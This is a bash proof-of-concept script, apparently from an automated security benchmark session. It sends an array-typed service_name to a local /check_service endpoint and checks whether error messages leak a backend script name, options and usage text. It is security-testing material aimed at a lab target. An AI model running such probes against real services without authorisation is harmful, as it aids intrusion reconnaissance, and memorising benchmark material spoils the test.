#!/bin/bash
# POC: Demonstrates information disclosure via error messages exposing script usage, command structure, and backend implementation details when passing array input to /check_service endpoint
# Target: ./repo
# Created: 2025-11-07T19:22:11.142Z
# Session: benchmark-XBEN-068-24-mhp8iflp

# Information Disclosure - Script Usage Exposed via Error Messages POC
# This script demonstrates how passing an array instead of a string for the
# service_name parameter exposes the backend script name, command structure,
# and available options through error messages.

TARGET_URL="http://localhost:8080/check_service"
CONTENT_TYPE="application/json"

echo "=========================================="
echo "Information Disclosure POC"
echo "Target: $TARGET_URL"
echo "=========================================="
echo ""

# Test 1: Send array as service_name parameter
echo "[*] Test 1: Sending array instead of string for service_name"
echo "[*] Payload: {\"service_name\":[\"apache\",\"nginx\"]}"
echo ""

RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: $CONTENT_TYPE" \
  -d '{"service_name":["apache","nginx"]}')

echo "[*] Response received:"
echo "$RESPONSE"
echo ""

# Check for script name disclosure
if echo "$RESPONSE" | grep -q "check_service.sh"; then
  echo "[+] VULNERABLE: Script name 'check_service.sh' is exposed in error message"
else
  echo "[-] Script name not found in response"
fi

# Check for usage information disclosure
if echo "$RESPONSE" | grep -q "\-t"; then
  echo "[+] VULNERABLE: Command option '-t' is exposed in error message"
else
  echo "[-] Command option not found in response"
fi

# Check for type options disclosure
if echo "$RESPONSE" | grep -q "systemctl\|custom"; then
  echo "[+] VULNERABLE: Supported types (systemctl, custom) are exposed in error message"
else
  echo "[-] Supported types not found in response"
fi

# Check for example commands
if echo "$RESPONSE" | grep -q "example\|usage"; then
  echo "[+] VULNERABLE: Usage examples or help text is exposed in error message"
else
  echo "[-] Usage examples not found in response"
fi

echo ""
echo "[*] Detailed Response Analysis:"
echo "================================"
echo "$RESPONSE" | head -20
echo ""
echo "[*] Full response length: $(echo "$RESPONSE" | wc -c) bytes"

# Exit with success if vulnerability is confirmed
if echo "$RESPONSE" | grep -q "check_service.sh"; then
  exit 0
else
  exit 1
fi